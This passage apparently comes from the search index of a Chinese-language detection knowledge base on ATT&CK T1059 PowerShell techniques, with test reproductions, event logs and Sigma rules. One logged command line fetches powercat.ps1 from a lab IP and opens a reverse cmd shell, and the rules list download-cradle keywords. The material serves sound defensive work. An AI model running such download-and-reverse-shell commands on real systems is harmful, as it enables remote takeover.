Corporation\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>#sysmon\u65e5\u5fd7\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows PowerShell\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell  -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd\"\n\n#win7\u5b89\u5168\u65e5\u5fd7\nEventID: 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x330\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\cmd.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeLimited (3)\n\nEventID: 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0xa44\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\n#Powershell V5(\u542bV5\u4ee5\u4e0a)\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u4ee5\u8fbe\u5230\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u7684\u6548\u679c\u3002\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u5206\u6790\u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u91c7\u7528\u914d\u7f6ewindows server 2008(\u4e0d\u542b2008)\u4ee5\u4e0a\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa\u7b56\u7565\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5bf9\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\uff0c\u6700\u540e\u8fbe\u5230\u76d1\u63a7\u6548\u679c\u3002\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: PowerShell\u901a\u8fc7url\u8fdb\u884c\u4e0b\u8f7d\nstatus: experimental\ndescription: \u68c0\u6d4b\u5728\u547d\u4ee4\u884c\u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u4e0b\u8f7d\u547d\u4ee4\u7684Powershell\u8fdb\u7a0b\ntags:\n    - attack.t1086\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\powershell.exe'\n        CommandLine:\n            - '*new-object system.net.webclient).downloadstring(*'\n            - '*new-object system.net.webclient).downloadfile(*'\n            - '*new-object net.webclient).downloadstring(*'\n            - '*new-object net.webclient).downloadfile(*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: medium\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_9","title":"\u5efa\u8bae","text":"<p>\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1059-001</p> <p>https://attack.mitre.org/techniques/T1059/001/</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/","title":"T1059-001-win-\u68c0\u6d4bPowershell2.0\u7248\u672c\u6267\u884c\u60c5\u51b5","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528PowerShell\u6765\u6267\u884c\u547d\u4ee4\u548c\u811a\u672c\u3002PowerShell\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u529f\u80fd\u5f3a\u5927\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u548c\u811a\u672c\u73af\u5883\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528PowerShell\u6267\u884c\u8bb8\u591a\u64cd\u4f5c\uff0c\u5305\u62ec\u53d1\u73b0\u4fe1\u606f\u548c\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u793a\u4f8b\u5305\u62ecStart-Process\u53ef\u7528\u4e8e\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u7684Invoke-Commandcmdlet\u548c\u53ef\u5728\u672c\u5730\u6216\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u547d\u4ee4\u7684cmdlet\uff08\u5c3d\u7ba1\u4f7f\u7528PowerShell\u8fde\u63a5\u5230\u8fdc\u7a0b\u7cfb\u7edf\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff09\u3002</p> <p>PowerShell\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4eceInternet\u4e0b\u8f7d\u5e76\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\u6267\u884c\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002</p> <p>\u63d0\u4f9b\u4e86\u8bb8\u591a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6027\u6d4b\u8bd5\u5de5\u5177\uff0c\u5305\u62ecEmpire\uff0cPowerSploit\uff0cPoshC2\u548cPSAttack\u3002</p> <p>\u8fd8\u53ef\u4ee5\u6267\u884cPowerShell\u547d\u4ee4\u6d3b\u811a\u672c\uff0c\u800c\u65e0\u9700\u901a\u8fc7.NET\u6846\u67b6\u548cWindows\u516c\u5171\u8bed\u8a00\u63a5\u53e3\uff08CLI\uff09\u516c\u5f00\u7684powershell.exePowerShell\u5e95\u5c42System.Management.Automation\u7a0b\u5e8f\u96c6DLL\u7684\u63a5\u53e3\u76f4\u63a5\u8c03\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u67e5\u627ePowerShell\u7248\u672c2.0\u7684\u6267\u884c\u60c5\u51b5\uff0c\u800c\u4e0d\u662f\u67e5\u627e\u4f7f\u7528\u7248\u672c2\u7684\u65e7\u811a\u672c\uff0c\u6216\u67e5\u627e\u8bd5\u56fe\u4ece\u811a\u672c\u65e5\u5fd7\u8bb0\u5f55\u548cAMSI\u4e2d\u9690\u85cf\u7684\u653b\u51fb\u8005\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#powershell-v20","title":"Powershell v2.0","text":"<p>\u8be5\u7248\u672c\u8f83\u65e7\u4e14\u4e0d\u5b89\u5168\uff0c\u5728\u5b89\u88c5\u7248\u672c5\u65f6\u4e0d\u4f1a\u5220\u9664\u3002\u5982\u679c\u672a\u88ab\u5220\u9664\uff0c\u653b\u51fb\u8005\u4ecd\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4e0d\u5b89\u5168\u7684\u7248\u672c\u3002(powershell.exe -Version 2.0 -Command {} -ExecutionPolicy )"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows powershell\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565</p> <ul> <li>\u6309Win+R\u6253\u5f00Windows\u8fd0\u884c\u7a97\u53e3,\u5728\u8f93\u5165\u6846\u91cc\u8f93\u5165gepdit.msc,\u6253\u5f00Windows\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668;</li> <li>\u627e\u5230\u8ba1\u7b97\u673a\u914d\u7f6e/\u7ba1\u7406\u6a21\u677f/Windows\u7ec4\u4ef6/Windows Powershell\uff0c\u6839\u636e\u9700\u6c42\u6253\u5f00\u53f3\u4fa7\u6240\u9700\u8981\u7684\u65e5\u5fd7\u529f\u80fd\uff1b</li> </ul>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>Microsoft Windows [\u7248\u672c 10.0.14393]\n(c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Users\\12306br0&gt;powershell -v 2\n\u672a\u5b89\u88c5 .NET Framework \u7248\u672c v2.0.50727\uff0c\u8fd0\u884c Windows PowerShell \u7248\u672c 2 \u9700\u8981\u6b64\u7248\u672c\u7684 .NET Framework\u3002\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>\u4e8b\u4ef6ID\uff1a4688\n\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  361A\\12306br0\n \u5e10\u6237\u540d:  12306br0\n \u5e10\u6237\u57df:  361A\n \u767b\u5f55 ID:  0x507DC\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x1158\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\Medium Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x17cc\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: powershell  -v 2\n\n\u201c\u4ee4\u724c\u63d0\u5347\u7c7b\u578b\u201d\u8868\u793a\u6839\u636e\u7528\u6237\u5e10\u6237\u63a7\u5236\u7b56\u7565\u5206\u914d\u7ed9\u65b0\u8fdb\u7a0b\u7684\u4ee4\u724c\u7c7b\u578b\u3002\n\n\u7c7b\u578b 1 \u662f\u672a\u5220\u9664\u7279\u6743\u6216\u672a\u7981\u7528\u7ec4\u7684\u5b8c\u5168\u4ee4\u724c\u3002\u5b8c\u5168\u4ee4\u724c\u4ec5\u5728\u7981\u7528\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\u6216\u8005\u7528\u6237\u662f\u5185\u7f6e\u7ba1\u7406\u5458\u5e10\u6237\u6216\u670d\u52a1\u5e10\u6237\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u3002\n\n\u7c7b\u578b 2 \u662f\u672a\u5220\u9664\u7279\u6743\u6216\u672a\u7981\u7528\u7ec4\u7684\u63d0\u5347\u4ee4\u724c\u3002\u5f53\u542f\u7528\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\u5e76\u4e14\u7528\u6237\u9009\u62e9\u4f7f\u7528\u201c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884c\u201d\u9009\u9879\u542f\u52a8\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u4f7f\u7528\u63d0\u5347\u4ee4\u724c\u3002\u5f53\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u4e3a\u59cb\u7ec8\u9700\u8981\u7ba1\u7406\u7279\u6743\u6216\u59cb\u7ec8\u9700\u8981\u6700\u9ad8\u7279\u6743\u5e76\u4e14\u7528\u6237\u662f\u7ba1\u7406\u5458\u7ec4\u7684\u6210\u5458\u65f6\uff0c\u4e5f\u4f1a\u4f7f\u7528\u63d0\u5347\u4ee4\u724c\u3002\n\n\u7c7b\u578b 3 \u662f\u5220\u9664\u4e86\u7ba1\u7406\u7279\u6743\u5e76\u7981\u7528\u4e86\u7ba1\u7406\u7ec4\u7684\u53d7\u9650\u4ee4\u724c\u3002\u5f53\u542f\u7528\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\uff0c\u5e94\u7528\u7a0b\u5e8f\u4e0d\u9700\u8981\u7ba1\u7406\u7279\u6743\u5e76\u4e14\u7528\u6237\u672a\u9009\u62e9\u4f7f\u7528\u201c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884c\u201d\u9009\u9879\u542f\u52a8\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u4f7f\u7528\u53d7\u9650\u4ee4\u724c\u3002\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4bPowerShell 2.0\u7248\u672c\u6267\u884c\u60c5\u51b5\nstatus: experimental\ndescription: \u68c0\u6d4b\u5728powershell\u964d\u7ea7\u4f7f\u7528\uff0cwindows server 2016\u6d4b\u8bd5\ntags:\n    - attack.t1059-001\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: \n            - '*\\powershell.exe'\n            - '*\\powershell_ise.exe'\n        CommandLine:\n            - '-v 2'\n            - '-v 2.0'\n            - '-version 2'\n            - '-version 2.0'\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_6","title":"\u5efa\u8bae","text":"<p>\u53ef\u4f7f\u7528windows\u5b89\u5168\u65e5\u5fd7\u3001Powershell\u65e5\u5fd7\u3001Sysmon\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1059-001</p> <p>https://attack.mitre.org/techniques/T1059/001/</p> <p>\u68c0\u6d4b\u548c\u7f13\u89e3PowerShell\u653b\u51fb\u7684\u65b9\u6cd5</p> <p>https://blog.csdn.net/qq_36334464/article/details/101519839</p> <p>PowerShell\u7248\u672c2.0\u6267\u884c</p> <p>https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/powershell-version-2.0-execution.md</p> <p>Powershell\u4e0e\u5a01\u80c1\u72e9\u730e</p> <p>https://www.freebuf.com/articles/terminal/267080.html</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/","title":"T1059-001-win-\u68c0\u6d4bPowershell\u4e0b\u8f7d\u6587\u4ef6","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528PowerShell\u6765\u6267\u884c\u547d\u4ee4\u548c\u811a\u672c\u3002PowerShell\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u529f\u80fd\u5f3a\u5927\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u548c\u811a\u672c\u73af\u5883\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528PowerShell\u6267\u884c\u8bb8\u591a\u64cd\u4f5c\uff0c\u5305\u62ec\u53d1\u73b0\u4fe1\u606f\u548c\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u793a\u4f8b\u5305\u62ecStart-Process\u53ef\u7528\u4e8e\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u7684Invoke-Commandcmdlet\u548c\u53ef\u5728\u672c\u5730\u6216\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u547d\u4ee4\u7684cmdlet\uff08\u5c3d\u7ba1\u4f7f\u7528PowerShell\u8fde\u63a5\u5230\u8fdc\u7a0b\u7cfb\u7edf\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff09\u3002</p> <p>PowerShell\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4eceInternet\u4e0b\u8f7d\u5e76\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\u6267\u884c\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002</p> <p>\u63d0\u4f9b\u4e86\u8bb8\u591a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6027\u6d4b\u8bd5\u5de5\u5177\uff0c\u5305\u62ecEmpire\uff0cPowerSploit\uff0cPoshC2\u548cPSAttack\u3002</p> <p>\u8fd8\u53ef\u4ee5\u6267\u884cPowerShell\u547d\u4ee4\u6d3b\u811a\u672c\uff0c\u800c\u65e0\u9700\u901a\u8fc7.NET\u6846\u67b6\u548cWindows\u516c\u5171\u8bed\u8a00\u63a5\u53e3\uff08CLI\uff09\u516c\u5f00\u7684powershell.exePowerShell\u5e95\u5c42System.Management.Automation\u7a0b\u5e8f\u96c6DLL\u7684\u63a5\u53e3\u76f4\u63a5\u8c03\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_1","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows powershell\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565</p> <ul> <li>\u6309Win+R\u6253\u5f00Windows\u8fd0\u884c\u7a97\u53e3,\u5728\u8f93\u5165\u6846\u91cc\u8f93\u5165gepdit.msc,\u6253\u5f00Windows\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668;</li> <li>\u627e\u5230\u8ba1\u7b97\u673a\u914d\u7f6e/\u7ba1\u7406\u6a21\u677f/Windows\u7ec4\u4ef6/Windows Powershell\uff0c\u6839\u636e\u9700\u6c42\u6253\u5f00\u53f3\u4fa7\u6240\u9700\u8981\u7684\u65e5\u5fd7\u529f\u80fd\uff1b</li> </ul>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_2","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>PS C:\\Users\\12306br0&gt; IEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/de\ntails/89361287')\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_3","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>Powershell\u4e8b\u4ef6ID\uff1a4104\n\u6b63\u5728\u521b\u5efa Scriptblock \u6587\u672c(\u5df2\u5b8c\u6210 1\uff0c\u5171 1):\nIEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/details/89361287')\n\nScriptBlock ID: e9f29288-34e7-497f-8fff-9a6cf6c355da\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_4","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4bPowerShell\u4e0b\u8f7d\u6587\u4ef6\u884c\u4e3a\nstatus: experimental\ndescription: \u68c0\u6d4b\u5728powershell\u4e0b\u8f7d\u6587\u4ef6\u884c\u4e3a\uff0cwindows server 2016\u6d4b\u8bd5\ntags:\n    - attack.t1059-001\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: \n            - '*\\powershell.exe'\n            - '*\\powershell_ise.exe'\n        CommandLine:\n            - '*Net.WebClient*'\n            - '*DownloadFile*'\n            - '*Invoke-WebRequest*'\n            - '*Invoke-Shellcode*'\n            - '*http*'\n            - '*Start-BitsTransfer*'\n            - '*IEX*'\n            - '*mpcmdrun.exe*'\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_5","title":"\u5efa\u8bae","text":"<p>\u5728\u4f7f\u7528Powershell\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\u65f6\uff0c\u6211\u4eec\u4e0d\u5efa\u8bae\u4f7f\u7528\u8fdb\u7a0b\u540d\u79f0\u52a0\u547d\u4ee4\u884c\u5173\u952e\u8bcd\u5339\u914d\u7684\u65b9\u5f0f\u8fdb\u884c\u68c0\u6d4b\u3002\u56e0\u4e3aPowershell\u4e8b\u4ef6ID\uff1a4104\u4e2d\u5e76\u4e0d\u5305\u542b\u8fdb\u7a0b\u4fe1\u606f\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1059-001</p> <p>https://attack.mitre.org/techniques/T1059/001/</p> <p>PowerShell \u4e0b\u8f7d\u6587\u4ef6</p> <p>https://www.pstips.net/powershell-download-files.html</p> <p>\u68c0\u6d4bPowershell\u4e0b\u8f7d\u6587\u4ef6\u884c\u4e3a</p> <p>https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/PowerShell%20downloads.txt</p> <p>Powershell\u4e0e\u5a01\u80c1\u72e9\u730e</p> <p>https://www.freebuf.com/articles/terminal/267080.html</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/","title":"T1059-004-linux-\u811a\u672c","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528Unix shell\u547d\u4ee4\u548c\u811a\u672c\u6765\u6267\u884c\u3002Unix shell\u662fLinux\u548cmacOS\u7cfb\u7edf\u4e0a\u7684\u4e3b\u8981\u547d\u4ee4\u63d0\u793a\u7b26\uff0c\u5c3d\u7ba1Unix shell\u5b58\u5728\u8bb8\u591a\u53d8\u4f53\uff08\u4f8b\u5982sh\uff0cbash\uff0czsh\u7b49\uff09\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7279\u5b9a\u7684OS\u6216\u53d1\u884c\u7248\u3002Unix shell\u53ef\u4ee5\u4f7f\u7528\u67d0\u4e9b\u8981\u6c42\u63d0\u5347\u7279\u6743\u7684\u547d\u4ee4\u6765\u63a7\u5236\u7cfb\u7edf\u7684\u5404\u4e2a\u65b9\u9762\u3002</p> <p>Unix shell\u8fd8\u652f\u6301\u811a\u672c\uff0c\u8fd9\u4e9b\u811a\u672c\u652f\u6301\u987a\u5e8f\u6267\u884c\u547d\u4ee4\u4ee5\u53ca\u5176\u4ed6\u5178\u578b\u7684\u7f16\u7a0b\u64cd\u4f5c\uff0c\u4f8b\u5982\u6761\u4ef6\u548c\u5faa\u73af\u3002Shell\u811a\u672c\u7684\u5e38\u89c1\u7528\u6cd5\u5305\u62ec\u5197\u957f\u6216\u91cd\u590d\u7684\u4efb\u52a1\uff0c\u6216\u8005\u9700\u8981\u5728\u591a\u4e2a\u7cfb\u7edf\u4e0a\u8fd0\u884c\u540c\u4e00\u7ec4\u547d\u4ee4\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528Unix shell\u6765\u6267\u884c\u5404\u79cd\u547d\u4ee4\u6216\u6709\u6548\u8f7d\u8377\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053\u6216\u5728\u6a2a\u5411\u79fb\u52a8\u671f\u95f4\uff08\u4f8b\u5982\u4f7f\u7528SSH\uff09\u8bbf\u95ee\u4ea4\u4e92\u5f0f\u5916\u58f3\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u5229\u7528Shell\u811a\u672c\u5728\u53d7\u5bb3\u8005\u4e0a\u4f20\u9012\u6216\u6267\u884c\u591a\u4e2a\u547d\u4ee4\uff0c\u6216\u8005\u4f5c\u4e3a\u7528\u4e8e\u6301\u4e45\u6027\u7684\u6709\u6548\u8f7d\u8377\u7684\u4e00\u90e8\u5206\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5982\u4f55\u5728linux\u4e0b\u8fdb\u884c\u6a21\u62df\u548c\u6d4b\u8bd5\uff1f\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7b80\u5355bash\u811a\u672c\uff0c\u5e76\u6267\u884c\u5b83\u3002\u89c2\u5bdf\u5b83\u5728\u65e5\u5fd7\u4e2d\u7559\u4e0b\u7684\u75d5\u8ff9\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux audit\u65e5\u5fd7 